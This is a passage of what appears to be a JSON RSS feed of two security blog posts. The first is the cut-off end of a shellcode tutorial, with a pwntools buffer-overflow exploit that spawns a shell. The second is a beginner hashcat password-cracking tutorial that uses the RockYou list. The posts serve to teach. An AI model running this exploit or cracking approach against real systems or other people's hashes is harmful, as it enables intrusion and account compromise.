0x%xmov rsi, 0mov rdx, 0syscall\u0026quot;\u0026quot;\u0026quot; % (buffer_address), arch=\u0026#39;amd64\u0026#39;)payload  = b\u0026quot;/bin/sh\\0\u0026quot;payload += shellcodepayload  = payload.ljust(80 + 8, b\u0026quot;\\x90\u0026quot;)payload += p64(buffer_address + 8)p.recvuntil(b\u0026quot;What\u0026#39;s your name?\\n\u0026quot;)p.sendline(payload)p.interactive()As you can see we write a payload of 88 characters: eighty for the dimension of the buffer while the other eight for the saved ebp.Then we append the address of the buffer that will overwrite the saved eip. Be careful to add eight to the stack address because at the beginning we placed the string /bin/sh\\0.Finally, we can run the program and check if everything works.The shellcode works and we have obtained a reverse shell.Some final thoughtsIn this example we had more than enough space for our shellcode. Beware that sometimes you could have small space available. Instead to directly call an exec, you could start by calling a read to write more on the memory.After this basic tutorial, it should be simpler to start using shellcode exploits.Feel free to write your doubts or suggestions about this article."
      },
      {
        "title": "Basic password cracking with hashcat",
        "link": "https://2h3ph3rd.medium.com/basic-password-cracking-with-hashcat-cac4a5e6fb24?source=rss-5a9085122896------2",
        "pubDate": "Sat, 19 Feb 2022 17:02:43 GMT",
        "creator": "Francesco Pastore",
        "categories": [
          "cybersecurity",
          "hashcat",
          "security",
          "password-cracking",
          "basics"
        ],
        "guid": "https://medium.com/p/cac4a5e6fb24",
        "description": "As a developer, it could be very useful to know how can you test the security of your password hashes. How a hacker could break your hashes? In how much time he could get all the passwords in plain text?There are a lot of different ways to do it, in this article we will use the hashcat command utility.Wait, what type of hash is it?I can be sure that you know what type of hash your application uses, but how can a hacker identify it fastly?There are very simple tools to use, like a pip package called hashid.# you need python3 already installedpip install hashidhashid \u0026lt;hash\u0026gt;Once installed, it can identify what type of hash could be based on multiple factors like the string length or the characters used.Below we can see different hashes of the same string “password”:# MD55f4dcc3b5aa765d61d8327deb882cf99# LME52CAC67419A9A224A3B108F3FA6CB6D# SHA15baa61e4c9b93f3f0682250b6cf8331b7ee68fd8# SHA25e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8These are the results for the hashid analysis of the first hash:You can see MD5 in the top resultsNow I know the hash algorithm, so what?Now that we know the hash algorithm it is easier for us to do brute force cracking by generating all possible password combinations.Wait, testing all possible passwords could require a very long time. If you check only the 26 minuscule letters, a password with 10 characters means 26¹⁰ = 1,411670957×10¹⁴ possible combinations!In each position, we can have 26 possible characters (considering only the minuscule Latin letters)Fortunately, most people use passwords simple to remember like birthday or anniversary dates, relatives’ names, or film/videogames/tv characters like “pikachu” or “brucelee”.Hashcat can work with regex and pattern generation to start the cracking only with the most common password.Password listsOne of the most commonly used password lists is the RockYou list.You can find it easily on the internet or already downloaded on the most common security distro like Kali or Parrot.Even using this list could require a long time, mainly when also the hashing algorithm is complex and with a slower execution.For this reason, exists smaller collections of RockYou with only the most common password based on popularity.Rockyou list on Kali LinuxSome cracking attemptsNow we have the hash and a password list, also we know the type of hash and which tool to use. We can start the cracking!We need to specify the hashcat mode that corresponds to the hash algorithm to use.We can easily find it by searching in the help output with a grep command followed by the hash name.Searching for MD5 modeAfter specifying the mode, we only need to write the hash and a wordlist, then hashcat will do its work. That’s it!# on kali linux /usr/share/wordlists/rockyou.txthashcat -m 0 bdc87b9c894da5168059e00ebffb9077 path/to/wordlists/rockyou.txtHashcat result for the first hash, mode md5, and password list rockyou.txtI hope that this brief tutorial helps you to understand the basics of password cracking. Don’t hesitate to write in comments your thoughts or doubts!"
      }
    ]
  }
}